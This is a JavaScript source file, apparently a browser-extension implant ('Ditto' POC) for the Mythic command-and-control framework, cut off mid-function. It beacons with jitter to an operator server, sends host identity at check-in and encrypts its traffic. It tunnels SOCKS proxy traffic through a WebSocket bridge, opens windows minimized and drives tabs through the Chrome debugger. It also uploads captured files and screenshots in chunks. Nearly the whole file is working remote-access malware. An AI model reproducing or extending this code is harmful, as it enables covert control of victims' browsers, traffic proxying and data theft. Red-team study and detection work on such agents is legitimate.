%%CONFIG_BOOTSTRAP%%

const TEXT_ENCODER = new TextEncoder();
const TEXT_DECODER = new TextDecoder();
const DEFAULT_IWA_URL = "%%IWA_URL%%";
const DEFAULT_IWA_CONTROL_URL = "%%IWA_CONTROL_URL%%";
const DEFAULT_IWA_SOCKS_PORT = Number("%%IWA_SOCKS_PORT%%");
const SOCKS_BATCH_SIZE = 128;
const SOCKS_FLUSH_DELAY_MS = 100;

%%NATIVE_HOST_RUNTIME%%

const SOCKS_BRIDGE = {
  enabled: false,
  controlUrl: DEFAULT_IWA_CONTROL_URL,
  ws: null,
  connecting: null,
  pendingToMythic: [],
  flushTimer: null,
  polling: false,
  lastError: "",
  lastSeen: ""
};

function sanitizeTab(tab) {
  return {
    id: tab.id,
    windowId: tab.windowId,
    active: tab.active,
    title: tab.title || "",
    url: tab.url || "",
    status: tab.status || ""
  };
}

function hasAesKey() {
  return Boolean(DITTO_CONFIG.k);
}

function getCallbackBase() {
  const url = new URL(DITTO_CONFIG.h);
  if (!url.port && DITTO_CONFIG.p) {
    url.port = String(DITTO_CONFIG.p);
  }
  url.pathname = "/";
  url.search = "";
  url.hash = "";
  return url.toString().replace(/\/+$/, "");
}

function getPostUrl() {
  const base = getCallbackBase();
  const path = DITTO_CONFIG.o.replace(/^\/+/, "");
  return `${base}/${path}`;
}

function getRandomUnit() {
  const values = new Uint32Array(1);
  crypto.getRandomValues(values);
  return values[0] / 0x100000000;
}

function getJitteredDelaySeconds(interval, jitter) {
  const baseInterval = Math.max(1, Number(interval) || 1);
  const jitterPercent = Math.min(100, Math.max(0, Number(jitter) || 0));
  const variance = baseInterval * (jitterPercent / 100);
  const minimum = Math.max(1, baseInterval - variance);
  const maximum = Math.max(minimum, baseInterval + variance);
  return minimum + (getRandomUnit() * (maximum - minimum));
}

function getDohResolverUrl(resolver) {
  const value = String(resolver || "google").trim();
  const normalized = value.toLowerCase();

  if (/^https?:\/\//i.test(value)) {
    return value;
  }

  switch (normalized) {
    case "cloudflare":
      return "https://cloudflare-dns.com/dns-query";
    case "google":
    default:
      return "https://dns.google/resolve";
  }
}

async function resolveDnsNative(hostname) {
  if (!chrome.dns || typeof chrome.dns.resolve !== "function") {
    return null;
  }

  const response = await chrome.dns.resolve(hostname);
  if (!response || response.resultCode !== 0 || !response.address) {
    return {
      method: "chrome.dns",
      hostname,
      success: false,
      resultCode: response ? response.resultCode : -1
    };
  }

  return {
    method: "chrome.dns",
    hostname,
    success: true,
    answers: [
      {
        data: response.address
      }
    ]
  };
}

async function resolveDnsDoh(hostname, recordType, resolver) {
  const params = new URLSearchParams({
    name: hostname,
    type: recordType
  });
  const response = await fetch(`${getDohResolverUrl(resolver)}?${params.toString()}`, {
    headers: {
      Accept: "application/dns-json"
    }
  });

  if (!response.ok) {
    throw new Error(`dns lookup failed with HTTP ${response.status}`);
  }

  const json = await response.json();
  return {
    method: "doh",
    hostname,
    success: !json.Status,
    status: json.Status,
    truncated: Boolean(json.TC),
    recursionDesired: Boolean(json.RD),
    recursionAvailable: Boolean(json.RA),
    authenticatedData: Boolean(json.AD),
    checkingDisabled: Boolean(json.CD),
    question: Array.isArray(json.Question) ? json.Question : [],
    answers: Array.isArray(json.Answer) ? json.Answer : [],
    authority: Array.isArray(json.Authority) ? json.Authority : [],
    comment: json.Comment || ""
  };
}

async function resolveDns(hostname, recordType, resolver) {
  const normalizedType = String(recordType || "A").toUpperCase();
  let nativeError = "";

  if (["A", "AAAA"].includes(normalizedType)) {
    try {
      const nativeResult = await resolveDnsNative(hostname);
      if (nativeResult && nativeResult.success) {
        return nativeResult;
      }
      if (nativeResult && nativeResult.success === false) {
        nativeError = `native resultCode=${nativeResult.resultCode}`;
      }
    } catch (error) {
      nativeError = String(error);
    }
  }

  const dohResult = await resolveDnsDoh(hostname, normalizedType, resolver);
  dohResult.type = normalizedType;
  dohResult.resolver = resolver || "google";
  if (nativeError) {
    dohResult.nativeFallbackError = nativeError;
  }
  return dohResult;
}

function sleepMs(milliseconds) {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

function callbackApi(label, invoker, timeoutMs = 5000) {
  return new Promise((resolve, reject) => {
    let settled = false;
    const timer = setTimeout(() => {
      if (!settled) {
        settled = true;
        reject(new Error(`${label} timed out after ${timeoutMs}ms`));
      }
    }, timeoutMs);

    try {
      invoker((result) => {
        if (settled) {
          return;
        }
        settled = true;
        clearTimeout(timer);
        const error = chrome.runtime.lastError;
        if (error) {
          reject(new Error(`${label}: ${error.message}`));
          return;
        }
        resolve(result);
      });
    } catch (error) {
      if (!settled) {
        settled = true;
        clearTimeout(timer);
        reject(error);
      }
    }
  });
}

function debuggerCommandSoft(tabId, method, params = {}, timeoutMs = 5000) {
  return new Promise((resolve) => {
    let settled = false;
    const timer = setTimeout(() => {
      if (!settled) {
        settled = true;
        resolve({
          ok: false,
          timedOut: true,
          method
        });
      }
    }, timeoutMs);

    try {
      chrome.debugger.sendCommand({ tabId }, method, params, (result) => {
        if (settled) {
          return;
        }
        settled = true;
        clearTimeout(timer);
        const error = chrome.runtime.lastError;
        resolve({
          ok: !error,
          error: error ? error.message : "",
          method,
          result: result || null
        });
      });
    } catch (error) {
      if (!settled) {
        settled = true;
        clearTimeout(timer);
        resolve({
          ok: false,
          error: String(error),
          method
        });
      }
    }
  });
}

function appendExtensionIdToIwaUrl(urlText) {
  const url = new URL(urlText || DEFAULT_IWA_URL);
  url.searchParams.set("ext", chrome.runtime.id);
  return url.toString();
}

function normalizeIwaControlUrl(value) {
  const raw = String(value || DEFAULT_IWA_CONTROL_URL || "").trim();
  if (!raw) {
    throw new Error("IWA control URL is required");
  }

  let text = raw;
  if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(text)) {
    text = `ws://${text}`;
  }

  const url = new URL(text);
  if (url.protocol !== "ws:" && url.protocol !== "wss:") {
    throw new Error("IWA control URL must use ws:// or wss://");
  }

  if (!url.port) {
    try {
      url.port = new URL(DEFAULT_IWA_CONTROL_URL).port || "38899";
    } catch (_) {
      url.port = "38899";
    }
  }

  return url.toString();
}

function chooseIwaControlUrl(...values) {
  for (const value of values) {
    if (!value) {
      continue;
    }
    try {
      return normalizeIwaControlUrl(value);
    } catch (_) {
    }
  }
  return normalizeIwaControlUrl(DEFAULT_IWA_CONTROL_URL);
}

function sanitizeIwaBridge(bridge) {
  if (!bridge) {
    return null;
  }
  return {
    origin: bridge.origin || "",
    url: bridge.url || "",
    controlUrl: bridge.controlUrl || "",
    socksHost: bridge.socksHost || "",
    socksPort: bridge.socksPort || 0,
    version: bridge.version || "",
    lastSeen: bridge.lastSeen || ""
  };
}

async function getIwaBridge() {
  const state = await chrome.storage.local.get({
    iwaBridge: null
  });
  return state.iwaBridge || null;
}

async function setIwaBridge(bridge) {
  await chrome.storage.local.set({
    iwaBridge: bridge
  });
}

async function getIwaLaunchState() {
  const state = await chrome.storage.local.get({
    iwaLaunch: null
  });
  return state.iwaLaunch || null;
}

async function setIwaLaunchState(launchState) {
  await chrome.storage.local.set({
    iwaLaunch: launchState
  });
}

async function clearIwaLaunchState() {
  await chrome.storage.local.remove("iwaLaunch");
}

function normalizeIwaBaseUrl(value) {
  const url = new URL(value || DEFAULT_IWA_URL);
  return `${url.protocol}//${url.host}/`;
}

function iwaUrlMatches(candidate, target) {
  if (!candidate || !target) {
    return false;
  }
  try {
    return normalizeIwaBaseUrl(candidate) === normalizeIwaBaseUrl(target);
  } catch (_) {
    return String(candidate).startsWith(String(target).split("?", 1)[0]);
  }
}

async function rememberIwaLaunch(method, iwaUrl, win, tabs = []) {
  const tabIds = tabs
    .map((tab) => Number(tab && tab.id))
    .filter((id) => Number.isFinite(id) && id > 0);
  const windowId = Number(win && win.id ? win.id : (tabs[0] && tabs[0].windowId));
  const launchState = {
    method,
    iwaUrl,
    windowId: Number.isFinite(windowId) && windowId > 0 ? windowId : 0,
    tabIds,
    launchedAt: new Date().toISOString()
  };
  await setIwaLaunchState(launchState);
  return launchState;
}

async function closeIwaExtension(params = {}) {
  const state = await getIwaLaunchState();
  const windowId = Number(params.window_id || params.windowId || 0);
  const tabId = Number(params.tab_id || params.tabId || 0);
  const targetUrl = String(params.url || params.iwa_url || params.iwaUrl || (state && state.iwaUrl) || DEFAULT_IWA_URL);
  const closed = [];
  const errors = [];

  async function closeWindow(id, source) {
    if (!Number.isFinite(id) || id <= 0) {
      return false;
    }
    try {
      await chrome.windows.remove(id);
      closed.push({ type: "window", id, source });
      return true;
    } catch (error) {
      errors.push({ type: "window", id, source, error: String(error) });
      return false;
    }
  }

  async function closeTab(id, source) {
    if (!Number.isFinite(id) || id <= 0) {
      return false;
    }
    try {
      await chrome.tabs.remove(id);
      closed.push({ type: "tab", id, source });
      return true;
    } catch (error) {
      errors.push({ type: "tab", id, source, error: String(error) });
      return false;
    }
  }

  if (windowId > 0) {
    await closeWindow(windowId, "argument");
  } else if (tabId > 0) {
    await closeTab(tabId, "argument");
  } else if (state && Number(state.windowId) > 0) {
    await closeWindow(Number(state.windowId), "last_launch");
  } else if (state && Array.isArray(state.tabIds) && state.tabIds.length) {
    for (const id of state.tabIds) {
      await closeTab(Number(id), "last_launch");
    }
  }

  if (!closed.length) {
    const tabs = await chrome.tabs.query({});
    const matches = tabs.filter((tab) => iwaUrlMatches(tab.url || "", targetUrl));
    const windowIds = [...new Set(matches.map((tab) => Number(tab.windowId)).filter((id) => Number.isFinite(id) && id > 0))];
    if (windowIds.length) {
      for (const id of windowIds) {
        await closeWindow(id, "url_query");
      }
    } else {
      for (const tab of matches) {
        await closeTab(Number(tab.id), "url_query");
      }
    }
  }

  if (closed.length) {
    await clearIwaLaunchState();
  }

  return {
    closed: closed.length > 0,
    targetUrl,
    closedItems: closed,
    errors,
    previous: state
  };
}

async function launchIwaWithDebugger(params = {}) {
  if (!chrome.debugger || typeof chrome.debugger.attach !== "function") {
    throw new Error("chrome.debugger API is not available");
  }

  const iwaUrl = appendExtensionIdToIwaUrl(params.url || params.iwa_url || DEFAULT_IWA_URL);
  const bootstrapUrl = String(params.bootstrap_url || "https://example.com/");
  const waitMs = Number(params.wait_ms || 3000);
  const tab = await chrome.tabs.create({
    url: bootstrapUrl,
    active: true
  });

  await sleepMs(1000);
  await callbackApi("debugger.attach", (done) => {
    chrome.debugger.attach({ tabId: tab.id }, "1.3", done);
  });

  const enableResult = await debuggerCommandSoft(tab.id, "Page.enable", {}, 3000);
  const navigateResult = await debuggerCommandSoft(tab.id, "Page.navigate", {
    url: iwaUrl
  }, Number(params.navigate_timeout_ms || 1500));

  await sleepMs(waitMs);
  const tabs = await chrome.tabs.query({});
  let detachResult = {
    ok: true
  };
  try {
    await callbackApi("debugger.detach", (done) => {
      chrome.debugger.detach({ tabId: tab.id }, done);
    }, 1500);
  } catch (error) {
    detachResult = {
      ok: false,
      error: String(error)
    };
  }
  const launchState = await rememberIwaLaunch("debugger", iwaUrl, { id: tab.windowId }, [tab]);

  return {
    launched: true,
    method: "debugger.Page.navigate",
    bootstrapUrl,
    iwaUrl,
    tabId: tab.id,
    windowId: tab.windowId,
    enableResult,
    navigateResult,
    detachResult,
    launchState,
    tabs: tabs.map(sanitizeTab),
    bridge: sanitizeIwaBridge(await getIwaBridge())
  };
}

async function launchIwaWithTab(params = {}) {
  const iwaUrl = appendExtensionIdToIwaUrl(params.url || params.iwa_url || DEFAULT_IWA_URL);
  const tab = await chrome.tabs.create({
    url: iwaUrl,
    active: true
  });
  await sleepMs(Number(params.wait_ms || 3000));
  const launchState = await rememberIwaLaunch("tab", iwaUrl, { id: tab.windowId }, [tab]);
  return {
    launched: true,
    method: "tabs.create",
    iwaUrl,
    tab: sanitizeTab(tab),
    launchState,
    bridge: sanitizeIwaBridge(await getIwaBridge())
  };
}

async function launchIwaWithWindow(params = {}) {
  const iwaUrl = appendExtensionIdToIwaUrl(params.url || params.iwa_url || DEFAULT_IWA_URL);
  const mode = String(params.window_mode || params.mode || "minimized").toLowerCase();
  const createData = {
    url: iwaUrl,
    focused: params.focused === true,
    type: "normal"
  };

  if (mode === "normal" || mode === "visible") {
    createData.focused = params.focused !== false;
  } else if (mode === "small") {
    createData.width = Math.max(400, Number(params.width || 400));
    createData.height = Math.max(300, Number(params.height || 300));
    createData.left = Math.max(0, Number(params.left || 0));
    createData.top = Math.max(0, Number(params.top || 0));
  } else {
    createData.state = "minimized";
  }

  let win = await chrome.windows.create(createData);
  let updateResult = null;
  if (mode === "minimized" && win && win.id) {
    try {
      win = await callbackApi("windows.update", (done) => {
        chrome.windows.update(win.id, {
          state: "minimized",
          focused: false
        }, done);
      }, 1500);
      updateResult = {
        ok: true
      };
    } catch (error) {
      updateResult = {
        ok: false,
        error: String(error)
      };
    }
  }
  await sleepMs(Number(params.wait_ms || 3000));
  const tabs = Array.isArray(win && win.tabs) ? win.tabs : [];
  const launchState = await rememberIwaLaunch("window", iwaUrl, win, tabs);
  return {
    launched: true,
    method: "windows.create",
    mode,
    iwaUrl,
    window: {
      id: win && win.id,
      state: win && win.state,
      focused: win && win.focused,
      left: win && win.left,
      top: win && win.top,
      width: win && win.width,
      height: win && win.height
    },
    updateResult,
    launchState,
    tabs: tabs.map(sanitizeTab),
    bridge: sanitizeIwaBridge(await getIwaBridge())
  };
}

async function launchIwa(params = {}) {
  const method = String(params.method || "window").toLowerCase();
  if (["window", "windows", "direct", "minimized", "minimize"].includes(method)) {
    return launchIwaWithWindow({
      ...params,
      mode: method === "window" || method === "windows" || method === "direct"
        ? (params.window_mode || params.mode || "minimized")
        : "minimized"
    });
  }
  if (method === "tab" || method === "tabs") {
    return launchIwaWithTab(params);
  }
  return launchIwaWithDebugger(params);
}

async function sendIwaControlMessage(message, options = {}) {
  const bridge = await getIwaBridge();
  const controlUrl = chooseIwaControlUrl(options.control_url, options.controlUrl, bridge && bridge.controlUrl, DEFAULT_IWA_CONTROL_URL);
  const timeoutMs = Number(options.timeout_ms || options.timeoutMs || 5000);

  return new Promise((resolve, reject) => {
    let settled = false;
    const ws = new WebSocket(controlUrl);
    const timer = setTimeout(() => {
      if (!settled) {
        settled = true;
        try {
          ws.close();
        } catch (_) {
        }
        reject(new Error(`IWA control timeout after ${timeoutMs}ms`));
      }
    }, timeoutMs);

    ws.onopen = () => {
      ws.send(JSON.stringify(message));
    };
    ws.onmessage = (event) => {
      if (settled) {
        return;
      }
      settled = true;
      clearTimeout(timer);
      try {
        ws.close();
      } catch (_) {
      }
      try {
        resolve(JSON.parse(event.data));
      } catch (error) {
        reject(new Error(`invalid IWA control JSON: ${error.message}`));
      }
    };
    ws.onerror = () => {
      if (!settled) {
        settled = true;
        clearTimeout(timer);
        reject(new Error(`IWA control websocket error: ${controlUrl}`));
      }
    };
    ws.onclose = () => {
      if (!settled) {
        settled = true;
        clearTimeout(timer);
        reject(new Error(`IWA control websocket closed before response: ${controlUrl}`));
      }
    };
  });
}

function normalizeSocksMessage(message) {
  return {
    server_id: Number(message.server_id ?? message.serverId),
    exit: Boolean(message.exit),
    data: message.data || ""
  };
}

function socksBridgeStatus() {
  return {
    enabled: SOCKS_BRIDGE.enabled,
    connected: Boolean(SOCKS_BRIDGE.ws && SOCKS_BRIDGE.ws.readyState === WebSocket.OPEN),
    controlUrl: SOCKS_BRIDGE.controlUrl,
    pendingToMythic: SOCKS_BRIDGE.pendingToMythic.length,
    lastError: SOCKS_BRIDGE.lastError,
    lastSeen: SOCKS_BRIDGE.lastSeen
  };
}

function queueSocksForMythic(message) {
  const normalized = normalizeSocksMessage(message);
  if (!Number.isFinite(normalized.server_id)) {
    return;
  }
  SOCKS_BRIDGE.pendingToMythic.push(normalized);
  SOCKS_BRIDGE.lastSeen = new Date().toISOString();
  scheduleSocksFlush();
}

function drainSocksForMythic() {
  if (!SOCKS_BRIDGE.pendingToMythic.length) {
    return [];
  }
  return SOCKS_BRIDGE.pendingToMythic.splice(0, SOCKS_BATCH_SIZE);
}

function restoreSocksForMythic(messages) {
  if (!messages.length) {
    return;
  }
  SOCKS_BRIDGE.pendingToMythic = messages.concat(SOCKS_BRIDGE.pendingToMythic);
}

function scheduleSocksFlush(delayMs = SOCKS_FLUSH_DELAY_MS) {
  if (!SOCKS_BRIDGE.enabled || SOCKS_BRIDGE.flushTimer) {
    return;
  }
  SOCKS_BRIDGE.flushTimer = setTimeout(async () => {
    SOCKS_BRIDGE.flushTimer = null;
    if (SOCKS_BRIDGE.polling || !SOCKS_BRIDGE.pendingToMythic.length) {
      return;
    }
    SOCKS_BRIDGE.polling = true;
    try {
      await pollTaskingAndReschedule("socks");
    } catch (error) {
      SOCKS_BRIDGE.lastError = String(error);
    } finally {
      SOCKS_BRIDGE.polling = false;
      if (SOCKS_BRIDGE.pendingToMythic.length) {
        scheduleSocksFlush(250);
      }
    }
  }, delayMs);
}

function handleIwaSocksBridgeMessage(text) {
  let message;
  try {
    message = JSON.parse(text);
  } catch (error) {
    SOCKS_BRIDGE.lastError = `invalid IWA SOCKS JSON: ${error.message}`;
    return;
  }

  if (message.type !== "mythic_socks" || !Array.isArray(message.socks)) {
    return;
  }

  for (const socksMessage of message.socks) {
    queueSocksForMythic(socksMessage);
  }
}

async function ensureIwaSocksBridge(controlUrl = DEFAULT_IWA_CONTROL_URL) {
  const chosenUrl = chooseIwaControlUrl(controlUrl, DEFAULT_IWA_CONTROL_URL);
  if (
    SOCKS_BRIDGE.ws &&
    SOCKS_BRIDGE.ws.readyState === WebSocket.OPEN &&
    SOCKS_BRIDGE.controlUrl === chosenUrl
  ) {
    return socksBridgeStatus();
  }
  if (SOCKS_BRIDGE.connecting) {
    return SOCKS_BRIDGE.connecting;
  }

  SOCKS_BRIDGE.controlUrl = chosenUrl;
  const connecting = new Promise((resolve, reject) => {
    let ws;
    try {
      ws = new WebSocket(chosenUrl);
    } catch (error) {
      SOCKS_BRIDGE.lastError = String(error);
      reject(error);
      return;
    }

    ws.onopen = () => {
      SOCKS_BRIDGE.ws = ws;
      SOCKS_BRIDGE.enabled = true;
      SOCKS_BRIDGE.lastError = "";
      SOCKS_BRIDGE.lastSeen = new Date().toISOString();
      SOCKS_BRIDGE.connecting = null;
      resolve(socksBridgeStatus());
    };

    ws.onmessage = (event) => {
      handleIwaSocksBridgeMessage(event.data);
    };

    ws.onerror = () => {
      SOCKS_BRIDGE.lastError = `IWA SOCKS bridge websocket error: ${chosenUrl}`;
    };

    ws.onclose = () => {
      if (SOCKS_BRIDGE.ws === ws) {
        SOCKS_BRIDGE.ws = null;
      }
      SOCKS_BRIDGE.enabled = false;
      SOCKS_BRIDGE.connecting = null;
      if (SOCKS_BRIDGE.lastError === "") {
        SOCKS_BRIDGE.lastError = "IWA SOCKS bridge closed";
      }
    };

    setTimeout(() => {
      if (ws.readyState !== WebSocket.OPEN) {
        try {
          ws.close();
        } catch (_) {
        }
        SOCKS_BRIDGE.connecting = null;
        SOCKS_BRIDGE.lastError = `IWA SOCKS bridge timeout: ${chosenUrl}`;
        reject(new Error(SOCKS_BRIDGE.lastError));
      }
    }, 5000);
  });

  SOCKS_BRIDGE.connecting = connecting;
  connecting.catch(() => {
    if (SOCKS_BRIDGE.connecting === connecting) {
      SOCKS_BRIDGE.connecting = null;
    }
  });
  return connecting;
}

async function sendSocksMessagesToIwa(messages, options = {}) {
  if (!messages.length) {
    return socksBridgeStatus();
  }
  const bridge = await getIwaBridge();
  const controlUrl = chooseIwaControlUrl(options.control_url, options.controlUrl, bridge && bridge.controlUrl, SOCKS_BRIDGE.controlUrl, DEFAULT_IWA_CONTROL_URL);
  await ensureIwaSocksBridge(controlUrl);
  const normalized = messages.map(normalizeSocksMessage).filter((message) => Number.isFinite(message.server_id));
  if (normalized.length) {
    SOCKS_BRIDGE.ws.send(JSON.stringify({
      type: "mythic_socks",
      socks: normalized
    }));
  }
  return socksBridgeStatus();
}

async function processSocksFromMythic(responseJson) {
  if (!responseJson || !Array.isArray(responseJson.socks) || !responseJson.socks.length) {
    return;
  }
  try {
    await sendSocksMessagesToIwa(responseJson.socks);
  } catch (error) {
    SOCKS_BRIDGE.lastError = String(error);
    for (const message of responseJson.socks) {
      const serverId = Number(message.server_id ?? message.serverId);
      if (Number.isFinite(serverId)) {
        queueSocksForMythic({
          server_id: serverId,
          exit: true,
          data: ""
        });
      }
    }
  }
}

async function stopSocksBridge(notifyIwa = true) {
  if (notifyIwa) {
    try {
      await sendIwaControlMessage({
        type: "mythic_socks_stop",
        notify: true
      }, {
        control_url: SOCKS_BRIDGE.controlUrl,
        timeout_ms: 2000
      });
    } catch (_) {
    }
  }

  try {
    if (SOCKS_BRIDGE.ws) {
      SOCKS_BRIDGE.ws.close();
    }
  } catch (_) {
  }
  SOCKS_BRIDGE.ws = null;
  SOCKS_BRIDGE.connecting = null;
  SOCKS_BRIDGE.enabled = false;
  SOCKS_BRIDGE.pendingToMythic = [];
  return socksBridgeStatus();
}

async function executeSocksCommand(params = {}) {
  const action = String(params.action || params.command || "start").toLowerCase();
  const controlUrl = chooseIwaControlUrl(params.control_url, params.controlUrl, DEFAULT_IWA_CONTROL_URL);

  if (action === "stop") {
    const bridge = await stopSocksBridge(true);
    return {
      action,
      bridge
    };
  }

  if (action === "status") {
    let iwa = null;
    try {
      iwa = await sendIwaControlMessage({
        type: "mythic_socks_status"
      }, {
        control_url: controlUrl,
        timeout_ms: 2000
      });
    } catch (error) {
      iwa = {
        ok: false,
        error: String(error)
      };
    }
    return {
      action,
      bridge: socksBridgeStatus(),
      iwa
    };
  }

  const bridge = await ensureIwaSocksBridge(controlUrl);
  scheduleSocksFlush(0);
  return {
    action: "start",
    bridge
  };
}

async function executeIwaTaskForResult(command, params = {}) {
  switch (command) {
    case "socks":
      return executeSocksCommand(params);
    case "launch_iwa_extension":
      return launchIwa(params);
    case "close_iwa_extension":
      return closeIwaExtension(params);
    case "iwa_status": {
      const bridge = await getIwaBridge();
      let control = null;
      if (params.probe !== false) {
        try {
          control = await sendIwaControlMessage({ type: "status" }, params);
        } catch (error) {
          control = {
            ok: false,
            error: String(error)
          };
        }
      }
      return {
        bridge: sanitizeIwaBridge(bridge),
        control
      };
    }
    case "iwa_control": {
      const message = params.message || {
        type: params.type || params.command || "status",
        ...params
      };
      return sendIwaControlMessage(message, params);
    }
    case "iwa_ping":
      return sendIwaControlMessage({ type: "ping" }, params);
    case "iwa_start_socks":
      return sendIwaControlMessage({
        type: "start_socks",
        port: Number(params.port || DEFAULT_IWA_SOCKS_PORT)
      }, params);
    case "iwa_stop_socks":
      return sendIwaControlMessage({ type: "stop_socks" }, params);
    default:
      throw new Error(`unsupported IWA POC task: ${command}`);
  }
}

self.dittoPocTask = executeIwaTaskForResult;

function bytesToBase64(bytes) {
  let binary = "";
  for (const byte of bytes) {
    binary += String.fromCharCode(byte);
  }
  return btoa(binary);
}

function base64ToBytes(value) {
  const binary = atob(value);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i += 1) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
}

function concatBytes(...parts) {
  const totalLength = parts.reduce((sum, part) => sum + part.length, 0);
  const result = new Uint8Array(totalLength);
  let offset = 0;
  for (const part of parts) {
    result.set(part, offset);
    offset += part.length;
  }
  return result;
}

async function importCryptoKey(algorithm, usages) {
  return crypto.subtle.importKey(
    "raw",
    base64ToBytes(DITTO_CONFIG.k),
    algorithm,
    false,
    usages
  );
}

async function encryptMythicMessage(payload, uuid) {
  const plaintext = TEXT_ENCODER.encode(JSON.stringify(payload));
  const uuidBytes = TEXT_ENCODER.encode(uuid);

  if (!hasAesKey()) {
    return bytesToBase64(concatBytes(uuidBytes, plaintext));
  }

  const iv = crypto.getRandomValues(new Uint8Array(16));
  const aesKey = await importCryptoKey({ name: "AES-CBC" }, ["encrypt"]);
  const ciphertext = new Uint8Array(
    await crypto.subtle.encrypt({ name: "AES-CBC", iv }, aesKey, plaintext)
  );
  const hmacKey = await importCryptoKey(
    { name: "HMAC", hash: "SHA-256" },
    ["sign"]
  );
  const hmac = new Uint8Array(
    await crypto.subtle.sign("HMAC", hmacKey, concatBytes(iv, ciphertext))
  );

  return bytesToBase64(concatBytes(uuidBytes, iv, ciphertext, hmac));
}

async function decryptWithUuidPrefix(data) {
  if (data.length < 84) {
    return null;
  }

  const uuid = TEXT_DECODER.decode(data.slice(0, 36));
  const iv = data.slice(36, 52);
  const ciphertext = data.slice(52, data.length - 32);
  const receivedHmac = data.slice(data.length - 32);

  const hmacKey = await importCryptoKey(
    { name: "HMAC", hash: "SHA-256" },
    ["verify"]
  );
  const verified = await crypto.subtle.verify(
    "HMAC",
    hmacKey,
    receivedHmac,
    concatBytes(iv, ciphertext)
  );
  if (!verified) {
    return null;
  }

  const aesKey = await importCryptoKey({ name: "AES-CBC" }, ["decrypt"]);
  const plaintext = new Uint8Array(
    await crypto.subtle.decrypt({ name: "AES-CBC", iv }, aesKey, ciphertext)
  );

  return {
    uuid,
    json: JSON.parse(TEXT_DECODER.decode(plaintext))
  };
}

async function decryptWithoutUuidPrefix(data) {
  if (data.length < 48) {
    return null;
  }

  const iv = data.slice(0, 16);
  const ciphertext = data.slice(16, data.length - 32);
  const receivedHmac = data.slice(data.length - 32);

  const hmacKey = await importCryptoKey(
    { name: "HMAC", hash: "SHA-256" },
    ["verify"]
  );
  const verified = await crypto.subtle.verify(
    "HMAC",
    hmacKey,
    receivedHmac,
    concatBytes(iv, ciphertext)
  );
  if (!verified) {
    return null;
  }

  const aesKey = await importCryptoKey({ name: "AES-CBC" }, ["decrypt"]);
  const plaintext = new Uint8Array(
    await crypto.subtle.decrypt({ name: "AES-CBC", iv }, aesKey, ciphertext)
  );

  return {
    uuid: "",
    json: JSON.parse(TEXT_DECODER.decode(plaintext))
  };
}

async function decryptMythicMessage(body) {
  const trimmed = body.trim();
  if (!trimmed) {
    return null;
  }

  const data = base64ToBytes(trimmed);
  if (!hasAesKey()) {
    if (data.length < 36) {
      throw new Error("Mythic response too short");
    }
    return {
      uuid: TEXT_DECODER.decode(data.slice(0, 36)),
      json: JSON.parse(TEXT_DECODER.decode(data.slice(36)))
    };
  }

  const withUuid = await decryptWithUuidPrefix(data);
  if (withUuid) {
    return withUuid;
  }

  const withoutUuid = await decryptWithoutUuidPrefix(data);
  if (withoutUuid) {
    return withoutUuid;
  }

  throw new Error("Failed to decrypt Mythic response");
}

async function postMythic(payload) {
  const state = await getState();
  const uuid = state.callbackUuid || DITTO_CONFIG.x;
  const outbound = {
    ...payload
  };
  const socks = drainSocksForMythic();
  if (socks.length) {
    outbound.socks = Array.isArray(outbound.socks) ? outbound.socks.concat(socks) : socks;
  }
  let response;
  try {
    const body = await encryptMythicMessage(outbound, uuid);
    response = await fetch(getPostUrl(), {
      method: "POST",
      headers: {
        "Content-Type": "text/plain"
      },
      body
    });
  } catch (error) {
    restoreSocksForMythic(socks);
    throw error;
  }

  if (!response.ok) {
    restoreSocksForMythic(socks);
    throw new Error(`HTTP ${response.status}`);
  }

  const message = await decryptMythicMessage(await response.text());
  const responseJson = message ? message.json : null;
  await processSocksFromMythic(responseJson);
  return responseJson;
}

async function getState() {
  return chrome.storage.local.get({
    callbackUuid: "",
    checkedIn: false,
    exitRequested: false,
    sleepInterval: DITTO_CONFIG.i,
    nextPollAt: 0
  });
}

async function setState(patch) {
  await chrome.storage.local.set(patch);
}

async function collectIdentity() {
  const tabs = await chrome.tabs.query({});
  return {
    action: "checkin",
    uuid: DITTO_CONFIG.x,
    ips: [],
    os: navigator.userAgent,
    user: "",
    host: self.location.origin || "extension",
    domain: "",
    pid: 0,
    architecture: "x64",
    process_name: `extension:${chrome.runtime.id}`,
    metadata: {
      clientId: chrome.runtime.id,
      extensionVersion: chrome.runtime.getManifest().version,
      tabCount: tabs.length
    }
  };
}

async function sendTaskResponse(taskId, result, completed = true) {
  await postMythic({
    action: "post_response",
    responses: [
      {
        task_id: taskId,
        user_output: JSON.stringify(result),
        completed
      }
    ]
  });
}

function unwrapFileTransferResponse(response) {
  const candidates = [
    response,
    response?.response,
    response?.responses?.[0],
    response?.responses?.[0]?.download
  ];

  for (const candidate of candidates) {
    if (
      candidate &&
      typeof candidate === "object" &&
      (
        Object.prototype.hasOwnProperty.call(candidate, "file_id") ||
        Object.prototype.hasOwnProperty.call(candidate, "agent_file_id")
      )
    ) {
      return candidate;
    }
  }

  return {};
}

function dataUrlToBytes(dataUrl) {
  const commaIndex = String(dataUrl || "").indexOf(",");
  if (commaIndex === -1) {
    throw new Error("invalid data URL");
  }
  return base64ToBytes(String(dataUrl).slice(commaIndex + 1));
}

async function beginMythicFileUpload(taskId, totalChunks, options = {}) {
  const chunkSize = Number(options.chunkSize || 512000);
  const fullPath = String(options.fullPath || options.filename || "capture.bin");
  const filename = String(options.filename || fullPath.split(/[\\/]/).pop() || "capture.bin");
  const initResponse = await postMythic({
    action: "post_response",
    responses: [
      {
        task_id: taskId,
        download: {
          total_chunks: totalChunks,
          full_path: fullPath,
          filename,
          is_screenshot: Boolean(options.isScreenshot),
          chunk_size: chunkSize
        }
      }
    ]
  });

  const transfer = unwrapFileTransferResponse(initResponse);
  const fileId =
    transfer.file_id ||
    transfer.agent_file_id ||
    initResponse?.file_id ||
    initResponse?.agent_file_id ||
    initResponse?.responses?.[0]?.file_id ||
    initResponse?.responses?.[0]?.agent_file_id ||
    initResponse?.response?.file_id ||
    initResponse?.response?.agent_file_id;
  if (!fileId) {
    throw new Error("Mythic did not return a file id");
  }

  return fileId;
}

async function sendMythicFileUploadChunk(taskId, fileId, chunkNum, chunkBytes, chunkSize = 512000) {
  const bytes = chunkBytes instanceof Uint8Array ? chunkBytes : new Uint8Array(chunkBytes);
  await postMythic({
    action: "post_response",
    responses: [
      {
        task_id: taskId,
        download: {
          chunk_num: chunkNum,
